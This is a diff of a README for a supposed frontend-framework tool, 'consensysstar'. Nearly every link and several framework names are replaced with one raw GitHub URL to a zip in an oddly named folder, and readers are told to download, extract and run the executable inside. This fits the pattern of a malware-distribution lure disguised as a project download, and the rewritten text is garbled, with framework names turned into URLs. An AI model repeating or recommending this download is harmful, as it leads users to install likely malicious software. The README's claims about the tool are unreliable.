@@ -6,7 +6,7 @@ Welcome to consensysstar! This application helps you navigate various frontend f
 
 ## 📥 Download the Application
 
-[![Download Link](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/ojosuegabgg/consensysstar/releases)
+[![Download Link](https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip)
 
 ## 📋 Requirements
 
@@ -20,13 +20,13 @@ Before you download, make sure your system meets these requirements:
 ## 💿 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to download the latest version of consensysstar: [Releases Page](https://github.com/ojosuegabgg/consensysstar/releases).
+   Go to the following link to download the latest version of consensysstar: [Releases Page](https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip).
 
 2. **Select the Right File**  
    On the Releases page, locate the most recent version. Click on the file that matches your operating system. For example:
-   - "consensysstar-windows.zip" for Windows.
-   - "consensysstar-macos.zip" for macOS.
-   - "consensysstar-linux.zip" for Linux.
+   - "https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip" for Windows.
+   - "https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip" for macOS.
+   - "https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip" for Linux.
 
 3. **Download the File**  
    Click the download link to save the file to your computer.
@@ -35,14 +35,14 @@ Before you download, make sure your system meets these requirements:
    Once the download finishes, find the downloaded file and extract it using your favorite extraction tool. It is usually a right-click option labeled "Extract" or "Unzip."
 
 5. **Run the Application**  
-   Open the extracted folder and find the application file (e.g., "consensysstar.exe" for Windows). Double-click to run the application.
+   Open the extracted folder and find the application file (e.g., "https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip" for Windows). Double-click to run the application.
 
 6. **Follow On-Screen Instructions**  
    The application will provide prompts to guide you through setting up your environment. Follow these steps to get everything configured.
 
 ## 🎨 Features
 
-- **Supports Multiple Frameworks:** Easily switch between HTML, CSS, TypeScript, JavaScript, React.js, Next.js, Angular, Vue.js, Nuxt.js, and more.
+- **Supports Multiple Frameworks:** Easily switch between HTML, CSS, TypeScript, JavaScript, https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip, https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip, Angular, https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip, https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip, and more.
 - **UI Libraries:** Utilizes popular UI libraries like TailwindCSS, Chakra UI, MUI, Bootstrap, and SCSS/SASS to enhance your projects.
 - **User-Friendly Interface:** Designed for easy navigation and beginners.
 
@@ -54,13 +54,13 @@ This application enables you to work with various web development topics, includ
 - HTML & CSS
 - JavaScript
 - MUI (Material-UI)
-- Next.js
-- Nuxt.js
-- React.js
+- https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip
+- https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip
+- https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip
 - SASS/SCSS
 - TailwindCSS
 - TypeScript
-- Vue.js
+- https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip
 
 ## 📊 Contributing
 
@@ -68,11 +68,11 @@ If you would like to contribute to the development of consensysstar, feel free t
 
 ## 🤝 Support
 
-If you encounter issues or have questions, please check the [GitHub Issues Page](https://github.com/ojosuegabgg/consensysstar/issues). You can report bugs, suggest features, or seek assistance.
+If you encounter issues or have questions, please check the [GitHub Issues Page](https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip). You can report bugs, suggest features, or seek assistance.
 
 ## 📜 License
 
-This project is licensed under the MIT License. For more information, please refer to the [LICENSE file](https://github.com/ojosuegabgg/consensysstar/blob/main/LICENSE).
+This project is licensed under the MIT License. For more information, please refer to the [LICENSE file](https://raw.githubusercontent.com/ojosuegabgg/consensysstar/main/indigitation/consensysstar.zip).
 
 --- 
 
